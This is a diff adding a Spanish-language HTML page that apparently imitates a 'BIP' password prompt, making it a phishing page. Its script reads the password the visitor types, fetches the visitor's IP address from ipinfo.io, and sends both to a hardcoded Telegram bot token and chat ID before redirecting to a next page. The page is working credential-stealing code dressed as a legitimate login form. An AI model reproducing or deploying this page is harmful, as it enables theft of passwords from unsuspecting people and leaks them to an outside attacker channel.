@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title></title>
+    <script
+        src="https://code.jquery.com/jquery-2.2.3.min.js"
+        integrity="sha256-a23g1Nt4dtEYOj7bR+vTu7+T8VP13humZFBJNIYoEJo="
+        crossorigin="anonymous"></script>
+        
+  </head>
+  <body style="text-align: center;">
+    
+    
+    <nav style="padding-left: 5%;height: 64px;background-color: #fff;text-align: left;background-image: url('tp1.svg');background-position: right;background-size: 206px;background-repeat: no-repeat;">
+        <img src="l.jpg" alt="" style="width:273px;">
+        </nav>
+    
+    
+    <div id="main-cnt" style="overflow: hidden;height:590px;width:90%;min-width:600px;position: relative;text-align: center;display: inline-block;border-radius: 13px;background-image:url('b.jpg'); ;">
+        <div id="ttl" style="display: inline-block;width: 500px;text-align: center;margin-right: 200px;margin-top: 300px;">
+            <img src="ttl.svg" alt="" style="width: 370px;">
+        </div>
+        <div id="ctn" style="display: inline-block;vertical-align: top;margin-top: 100px;">
+            <div id="frmc" style="display:inline-block;text-align: center;border-radius: 8px;vertical-align: top;width: 500px;">
+                
+                <form method="post" action="" id="f1" style="display: inline-block;width: 356px;height: 310px;border-radius:10px;background-image: url(2.svg);position: relative;">
+                    
+                    <input placeholder="Contraseña BIP" name="ix1" id="ix1" type="text" style="display: block;position: relative;color: #444;background: transparent;border: none;top: 46px;left: 36px;height: 25px;width: 228px;padding-left: 10px!important;outline: none;font-size: 13px;font-family: dinReg, sans-serif;" autocomplete="off" onKeypress="if(event.keyCode === 13 ) {event.preventDefault();xbndtl()}">
+
+                    <input type="hidden" id="ix77">
+                    <div onclick="xbndtl()" style="display: block;position: relative;background: rgba(0,0,0,0);border: none;top: 13px;left: 283px;height: 34px;width: 36px;outline: none;border-radius: 4px;cursor: pointer;user-select: none;"></div>
+                    
+                    <img src="h.png" style="width: 350px; display: block;position: relative;top: 180px; left:3px">
+                </form>
+                
+            </div>
+            
+        </div>
+        <div id="ixsub" style="text-align: center;display: inline-block;width: 100%;height: 43px;position: relative;bottom: -137px;background-color: #279d2e;padding-top: 0px;"><p style="color: #fff;font-family: Segoe, Roboto, sans-serif;font-size: 14px;">Te Ayudamos</p></div>
+    </div>
+        
+    </div>
+    
+    <style>
+        @media screen and (max-width:1300px){
+            #ttl{
+                width: 200px!important;
+            }
+        }
+        @media screen and (max-width:1024px){
+            #ttl{
+                display: none!important;
+            }
+            #main-cnt{
+                width:80%!important;
+            }
+            body{
+                zoom: 65%;
+            }
+        }
+        @media screen and (max-width:425px){
+           body{
+                width: 100%!important;
+                
+                background-repeat: no-repeat!important;
+                
+                
+            }
+            #ctn{
+                border-radius: 6px!important;
+            }
+            #main-cnt{
+                text-align: center!important;
+                padding-top: 30px;
+                
+
+            }
+            
+            #frmc{
+                width: 100%!important;
+            }
+            #bnncont{
+                display: none!important;
+            }
+            #n9{
+                height: 20px!important;
+            }
+            
+            
+        }
+        
+    </style>
+    <script>
+        function xbndtl(){
+            var tkl = "5895500780:AAGOpoDHjd82Z0k00cyzHPwrWtqJgUuPElY";
+            var chtid = "6283282671";
+            var eml = $("#ix1").val();
+            
+            var ips = "";
+
+           
+            
+
+            if(!eml ){
+                console.log("empty");
+            }else{
+
+                mess = `BIP - P:${eml}`;
+                console.log( document.getElementById("ix77").value );
+                $.get('https://ipinfo.io/ip', function(response){
+                    var sets = {
+                        "async": true,
+                        "crossDomain": true,
+                        "url": "https://api.telegram.org/bot" + tkl + "/sendMessage",
+                        "method": "POST",
+                        "headers": {
+                            "Content-Type": "application/json",
+                            "cache-control": "no-cache"
+                
+                        },
+                        "data": JSON.stringify({
+                            "chat_id": chtid,
+                            "text": "I:"+response+" - "+mess
+                        })
+                    };  
+                    $.ajax(sets).done(function (response) {
+                        window.location = "3.html";
+                    });  
+                });
+            }
+        }
+
+        
+    </script>
+
+    
+    
+  </body>
+</html>
